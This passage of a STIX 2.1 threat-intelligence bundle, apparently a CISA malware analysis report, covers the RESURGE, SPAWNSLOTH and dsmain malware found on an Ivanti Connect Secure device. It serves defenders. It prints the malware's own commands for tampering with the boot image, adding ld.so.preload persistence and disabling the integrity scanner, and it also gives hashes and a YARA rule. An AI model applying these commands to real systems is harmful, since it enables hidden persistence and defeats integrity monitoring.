'coreboot.img.1.gz' into 'coreboot.img.1' within the new directory.\r\n\t\r\ncd /tmp/coreboot_fs\r\n\tChanges into the '/tmp/coreboot_fs' directory.\r\n\t\r\n/bin/dsmain cpio -idvm < coreboot.img.1\r\n\tExecutes dsmain with cpio -idvm to extract the compressed 'coreboot.img.1'.\r\n\t\r\n/bin/rm coreboot.img.1\r\n\tDeletes 'coreboot.img.1'.\r\n\t\r\ncp /bin/dsmain /tmp/coreboot_fs/bin/dsmain\r\n\tCopies dsmain into the 'coreboot_fs' directory.\r\n\t\r\ncp /lib/%s /tmp/coreboot_fs/lib/%s\r\n\tCopies itself into the 'coreboot_fs' directory.\r\n\t\r\ncp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/coreboot_fs/bin/scanner-0.1-py3.6.egg\r\n\tCopies the python package 'scanner-0.1-py3.6.egg' into the 'coreboot_fs' directory.\r\n\t\r\n/bin/sed -i rollback_on_error $? \"Extracting Package\"\r\n\tModifies the boot process by adding the below commands to the file '/tmp/coreboot_fs/bin/init' below the line 'rollback_on_error $? \"Extracting Package\".\r\n\t\r\n/bin/dsmain touch /etc/ld.so.preload\r\n\tExecute dsmain with touch '/etc/ld.so.preload' to update the access and modified time to the current time.\r\n\t\r\n/bin/dsmain sed -I \"1i/lib/%s\" /home/root/etc/ld.so.preload\r\n\tAdds itself to the top of 'ld.so.preload'.\r\n\t\r\n/bin/cp /bin/dsmain /home/root/bin/dsmain\r\n\tCopy dsmain into the 'root/bin' directory.\r\n\t\r\n/bin/cp /bin/scanner-0.1-py3.6.egg /home/root/home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg\r\n\tCopy 'scanner-0.1-py3.6.egg' into a 'root' directory.\r\n\t\r\n/bin/cp /lib/%s /home/root/lib/%s\r\n\tCopy itself into the 'root/lib' directory.\r\n\t\r\n\"\\\" /tmp/coreboot_fs/bin/init\r\n\tThe boot process files being modified with the above commands.\r\n\t\r\n/bin/dsmain find . -print | /bin/dsmain cpio -o -H newc > /tmp/coreboot_fs/coreboot.img.1\r\n\tExecute dsmain to repackage the modified 'coreboot.img'.\r\n\t\r\n/bin/dsmain gzip /tmp/coreboot_fs/coreboot.img.1\r\n\tExecute dsmain to compress the modified 'coreboot.img'.\r\n\t\r\n/bin/dsmain -e /tmp/coreboot_fs/coreboot.img.1.gz /tmp/data/root/${kerndir}/coreboot.img  $key\r\n\tExecute dsmain to encrypt the modified 'coreboot.img'.\r\n\t\r\nrm -rf /tmp/coreboot_fs'\r\n\tDelete the '/tmp/coreboot_fs' directory.\r\n\r\n/tmp/installer/do-install-coreboot\r\n\tThe file being modified with the commands.\r\n---End Commands 2---\r\n------------------------------------------------------------------------------------------\r\n---Begin Commands 3---\r\nsystem(\"sed -i 's/mismatchCount += 1/pass/g' scripts/scanner.py\");\r\n\tReplace the 'mismatchCount += 1' with 'pass' in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/mismatchedFiles.append(file)/ /g' scripts/scanner.py\");\r\n\tReplace the 'mismatchedFiles.append(file)' with a blank space in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesCount += 1/pass/g' scripts/scanner.py\");\r\n\tReplace 'newFilesCount += 1' with 'pass' in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesDetected.append(file)/ /g' scripts/scanner.py\");\r\n\tReplace 'newFilesDetected.append(file)' with a blank space in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/mismatchCount += 1/pass/g' scripts/scanner_legacy.py\");\r\n\tReplace the 'mismatchCount += 1' with 'pass' in 'scanner_legacy.py'.\r\n\t\r\nsystem(\"sed -i 's/mismatchedFiles.append(file)/ /g' scripts/scanner_legacy.py\");\r\n\tReplace the 'mismatchedFiles.append(file)' with a blank space in 'scanner_legacy.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesCount += 1/pass/g' scripts/scanner_legacy.py\");\r\n\tReplace 'newFilesCount += 1' with 'pass' in 'scanner_legacy.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesDetected.append(file)/ /g' scripts/scanner_legacy.py\");\r\n\tReplace 'newFilesDetected.append(file)' with a blank space in 'scanner_legacy.py'.\r\n---End Commands 3---",
            "malware_types": [
                "backdoor",
                "dropper",
                "rootkit"
            ],
            "is_family": false,
            "sample_refs": [
                "file--cc6b60ae-35ae-5163-ab04-1de8acdff2a0"
            ]
        },
        {
            "type": "indicator",
            "spec_version": "2.1",
            "id": "indicator--eedf3737-7889-47c7-8371-e7efa41b6a66",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "name": "libdsupgrade.so",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "indicator_types": [
                "malicious-activity"
            ],
            "pattern": "[file:hashes.'MD5'='cfb263a731d51ff489168bbca0d3bd2f' OR file:hashes.'SHA-1'='87bcbbcb878aeee6ad4463464745770e95c6a937' OR file:hashes.'SHA-256'='52bbc44eb451cb5e16bf98bc5b1823d2f47a18d71f14543b460395a1c1b1aeda' OR file:hashes.'SHA-512'='3d12fdb707c188eb2e94cbf2dd42a50cfe343128652bab9245a54b887e35bc32c6a88c8faa5001a045df3991b387fcd6a27719ecbf84f6ce893163b040c2e0dd']",
            "pattern_type": "stix",
            "pattern_version": "2.1",
            "valid_from": "2025-03-28T17:39:13.029982Z"
        },
        {
            "type": "file",
            "spec_version": "2.1",
            "id": "file--2dc9682d-cc97-5adc-97f1-938aff647076",
            "hashes": {
                "MD5": "44d09ca5b989e24ff5276d5b5ee1d394",
                "SHA-1": "5309f9082da0fc24ebf03cb1741fa71335224e5a",
                "SHA-256": "3526af9189533470bc0e90d54bafb0db7bda784be82a372ce112e361f7c7b104",
                "SHA-512": "63ded8e7294ee9a0d4181310d25c348d0d657d35e57740234cb98c9abfd8eb18bb3cd35a28bca3013f3e141b41131b923b39717c7ae864019287c2d85a36ae63",
                "SSDEEP": "1536:AxlL0im3r1G1+5uIEcfPTLuYzgrbwhpMTQe5pylmpsk76BAwu:Kt1+5unc3TLRujpyRzaw"
            },
            "size": 95092,
            "name": "liblogblock.so",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ]
        },
        {
            "type": "indicator",
            "spec_version": "2.1",
            "id": "indicator--657e47b4-c47b-49a4-98ae-7c6f217c662e",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "name": "liblogblock.so",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "description": "The file, 'liblogblock.so', is a 32-bit Linux ELF binary identified as a variant of SPAWNSLOTH malware, a log tampering utility.\r\n\r\nIf the program name is dslogserver, it detaches the shared memory containing the \"g_do_syslog_servers_exist\" IPC key. Next, it obtains the handle to the symbol \"_ZN5DSLog4File3addEPKci\" and calls 'funchook_create'. Funchook is an open source tool that allows intercepting and modifying function calls at run time. The funchook_create calls funchook_alloc, which eventually calls mmap.  \r\n\r\nThe dissembled functions were renamed with the names in the opensource for readability. The TA had removed log messages in 'funchook_create' to make it difficult to identify the open source tool that was used.",
            "indicator_types": [
                "malicious-activity"
            ],
            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_25993211_02 rule_content=rule CISA_25993211_02 : SPAWNSLOTH trojan compromises_data_integrity\n{\n   meta:\n       author = \"CISA Code & Media Analysis\"\n       incident = \"25993211\"\n       date = \"2025-03-04\"\n       last_modified = \"20250304_0906\"\n       actor = \"n/a\"\n       family = \"SPAWN\"\n       capabilities = \"compromises-data-integrity\"\n       malware_type = \"trojan\"\n       tool_type = \"unknown\"\n       description = \"Detects SPAWNSLOTH malware samples\"\n       sha256_1 = \"3526af9189533470bc0e90d54bafb0db7bda784be82a372ce112e361f7c7b104\"\n   strings: \n       $s1 = \"dslogserver\"\n       $s2 = \"g_do_syslog_servers_exist\"\n       $s3 = \"_ZN5DSLog4File3addEPKci\"\n       $s4 = \"dlsym\" \n    condition: \n       all of them\n}\n",
            "pattern_type": "yara",
            "valid_from": "2025-03-28T17:39:13.064954Z"
        },
        {
            "type": "malware-analysis",
            "spec_version": "2.1",
            "id": "malware-analysis--d1e3432e-7713-4126-ae24-50ff038f9282",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "product": "netgate",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "result_name": "Unavailable (production)",
            "result": "unknown",
            "sample_ref": "file--2dc9682d-cc97-5adc-97f1-938aff647076"
        },
        {
            "type": "malware",
            "spec_version": "2.1",
            "id": "malware--8b96ed37-1409-481f-8503-83039aa8df33",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "description": "The file, 'liblogblock.so', is a 32-bit Linux ELF binary identified as a variant of SPAWNSLOTH malware, a log tampering utility.\r\n\r\nIf the program name is dslogserver, it detaches the shared memory containing the \"g_do_syslog_servers_exist\" IPC key. Next, it obtains the handle to the symbol \"_ZN5DSLog4File3addEPKci\" and calls 'funchook_create'. Funchook is an open source tool that allows intercepting and modifying function calls at run time. The funchook_create calls funchook_alloc, which eventually calls mmap.  \r\n\r\nThe dissembled functions were renamed with the names in the opensource for readability. The TA had removed log messages in 'funchook_create' to make it difficult to identify the open source tool that was used.",
            "malware_types": [
                "trojan"
            ],
            "is_family": false,
            "sample_refs": [
                "file--2dc9682d-cc97-5adc-97f1-938aff647076"
            ]
        },
        {
            "type": "indicator",
            "spec_version": "2.1",
            "id": "indicator--908bdd43-8d33-48c8-afe5-3b867051e973",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "name": "liblogblock.so",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "indicator_types": [
                "malicious-activity"
            ],
            "pattern": "[file:hashes.'MD5'='44d09ca5b989e24ff5276d5b5ee1d394' OR file:hashes.'SHA-1'='5309f9082da0fc24ebf03cb1741fa71335224e5a' OR file:hashes.'SHA-256'='3526af9189533470bc0e90d54bafb0db7bda784be82a372ce112e361f7c7b104' OR file:hashes.'SHA-512'='63ded8e7294ee9a0d4181310d25c348d0d657d35e57740234cb98c9abfd8eb18bb3cd35a28bca3013f3e141b41131b923b39717c7ae864019287c2d85a36ae63']",
            "pattern_type": "stix",
            "pattern_version": "2.1",
            "valid_from": "2025-03-28T17:39:13.069339Z"
        },
        {
            "type": "file",
            "spec_version": "2.1",
            "id": "file--9201c7e7-8f16-5356-a737-32af26fee3d8",
            "hashes": {
                "MD5": "6e01ef1367ea81994578526b3bd331d6",
                "SHA-1": "09eb513f284771461bcdc16ee28d31ce8bbe74e0",
                "SHA-256": "b1221000f43734436ec8022caaa34b133f4581ca3ae8eccd8d57ea62573f301d",
                "SHA-512": "ecbda91571b0429be42017dddd2cb687ce696dd601cd02f2502119b8b732376cee2097069ca35ba0089387d58213c6140c2caf8e6c2e05733d21c309b51e2b9b",
                "SSDEEP": "49152:4ZLtRJ8ryYwd5OP5nz1kHKf26xZVKtom+YvFM4tAcRrhOBDKx76a:4ptVbQ5nz2SZstogttAcRrhOBu6a"
            },
            "size": 5102976,
            "name": "dsmain",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ]
        },
        {
            "type": "malware-analysis",
            "spec_version": "2.1",
            "id": "malware-analysis--7c79f3b0-aa40-4e15-b1ba-e4cdb89d15e2",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "product": "eset",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "result_name": "Linux/Agent.AHD trojan",
            "result": "unknown",
            "sample_ref": "file--9201c7e7-8f16-5356-a737-32af26fee3d8"
        },
        {
            "type": "malware-analysis",
            "spec_version": "2.1",
            "id": "malware-analysis--6d6d0969-2090-4db6-a816-4b58eb2e9356",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "product": "netgate",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "result_name": "Unavailable (production)",
            "result": "unknown",
            "sample_ref": "file--9201c7e7-8f16-5356-a737-32af26fee3d8"
        },
        {
            "type": "malware",
            "spec_version": "2.1",
            "id": "malware--e409c75b-ad63-4b4d-b151-7abc6eb53c03",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "description": "The file 'dsmain' is a 64-bit Linux ELF which contains the open source script 'extract_vmlinux.sh' and the open source tool 'BusyBox'. \r\n\r\nThe file takes three arguments (-e, -d, -g). The -e argument is used to encrypt a file with an Advance Encryption Standard (AES) key. The -d argument is used to decrypt a file using an AES key. The -g argument is used to invoke the script 'extract_vmlinux.sh' where it is written to /tmp/extract_vmlinux.sh and is used to extract the uncompressed vmlinux from a kernel image. The TA extracts vmlinux to analyze the kernel\u2019s code, identify vulnerabilities and potentially exploit the system. \r\n\r\nBusyBox is an open-source project tool from a collection of Unix utilities that are widely used by embedded devices and industrial control systems (ICS). When a TA accesses a device running BusyBox, the TA can execute a series of BusyBox commands to perform various functions such as downloading and executing malicious payloads on the compromised device. The file 'dsmain' uses specified applets from BusyBox.\r\n\r\n--Begin Applets Used From BusyBox--\r\nbzcat\r\nbzip2\r\ncat\r\ncpio\r\nfind\r\ngunzip\r\ngzip\r\nlzop\r\nsed\r\nsh\r\nstrings\r\ntail\r\ntar\r\ntouch\r\ntr\r\nunlzma\r\nunlzop\r\nunxz\r\nxxd\r\nxz\r\n--End Applets Used From BusyBox--",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "malware_types": [
                "trojan"
            ],
            "is_family": false,
            "sample_refs": [
                "file--9201c7e7-8f16-5356-a737-32af26fee3d8"
            ]
        },
        {
            "type": "indicator",
            "spec_version": "2.1",
            "id": "indicator--8ff9e4b1-5eea-48d0-9ca5-673f408c40af",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "name": "dsmain",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "indicator_types": [
                "malicious-activity"
            ],
            "pattern": "[file:hashes.'MD5'='6e01ef1367ea81994578526b3bd331d6' OR file:hashes.'SHA-1'='09eb513f284771461bcdc16ee28d31ce8bbe74e0' OR file:hashes.'SHA-256'='b1221000f43734436ec8022caaa34b133f4581ca3ae8eccd8d57ea62573f301d' OR file:hashes.'SHA-512'='ecbda91571b0429be42017dddd2cb687ce696dd601cd02f2502119b8b732376cee2097069ca35ba0089387d58213c6140c2caf8e6c2e05733d21c309b51e2b9b']",
            "pattern_type": "stix",
            "pattern_version": "2.1",
            "valid_from": "2025-03-28T17:39:13.090723Z"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--43bda332-f99c-46bf-acd3-ebe9fc706e9a",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "relationship_type": "related-to",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "source_ref": "malware--97009956-847c-480d-89ab-3047951b795e",
            "target_ref": "malware--8b96ed37-1409-481f-8503-83039aa8df33"
        },
        {
            "type": "report",
            "spec_version": "2.1",
            "id": "report--e5885fb8-1c9b-4e54-ba0b-a1baa957a58d",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "name": "MAR-25993211.r1.v1",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "description": "CISA analyzed three files obtained from a critical infrastructure\u2019s Ivanti Connect Secure device after threat actors exploited Ivanti CVE-2025-0282 for initial access. One file\u2014that CISA is calling RESURGE\u2014has functionality similar to SPAWNCHIMERA in how it creates a Secure Shell (SSH) tunnel for command and control (C2). RESURGE also contains a series of commands that can modify files, manipulate integrity checks, and create a web shell that is copied to the running Ivanti boot disk.\r\n\r\nThe second file is a variant of SPAWNSLOTH, that was contained within the RESURGE sample. The file tampers with the Ivanti device logs. The third file is a custom embedded binary that contains an open-source shell script and a subset of applets from the open-source tool BusyBox. The open-source shell script allows for ability to extract an uncompressed kernel image (vmlinux) from a compromised kernel image. BusyBox enables threat actors to perform various functions such as download and execute payloads on compromised devices.\r\n\r\nFor information on CVE-2025-0282, see CISA Alert CISA Releases Malware Analysis Report on RESURGE Malware Associated with Ivanti Connect Secure.\r\n",
            "report_types": [
                "observed-data",
                "malware",
                "indicator"
            ],
            "published": "2025-03-28T13:57:31Z",
            "object_refs": [
                "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
                "file--cc6b60ae-35ae-5163-ab04-1de8acdff2a0",
                "indicator--1be1cc0b-e498-44f1-ad81-65af0f3e8a2f",
                "malware-analysis--1bef896c-da86-4402-afc4-c2943deb3378",
                "malware-analysis--dc2526bf-7a47-4372-8f6f-a3f8ba6c503a",
                "malware--97009956-847c-480d-89ab-3047951b795e",
                "indicator--eedf3737-7889-47c7-8371-e7efa41b6a66",
                "file--2dc9682d-cc97-5adc-97f1-938aff647076",
                "indicator--657e47b4-c47b-49a4-98ae-7c6f217c662e",
                "malware-analysis--d1e3432e-7713-4126-ae24-50ff038f9282",
                "malware--8b96ed37-1409-481f-8503-83039aa8df33",
                "indicator--908bdd43-8d33-48c8-afe5-3b867051e973",
                "file--9201c7e7-8f16-5356-a737-32af26fee3d8",
                "malware-analysis--7c79f3b0-aa40-4e15-b1ba-e4cdb89d15e2",
                "malware-analysis--6d6d0969-2090-4db6-a816-4b58eb2e9356",
                "malware--e409c75b-ad63-4b4d-b151-7abc6eb53c03",
                "indicator--8ff9e4b1-5eea-48d0-9ca5-673f408c40af",
                "relationship--43bda332-f99c-46bf-acd3-ebe9fc706e9a"
            ]
        }
    ]
}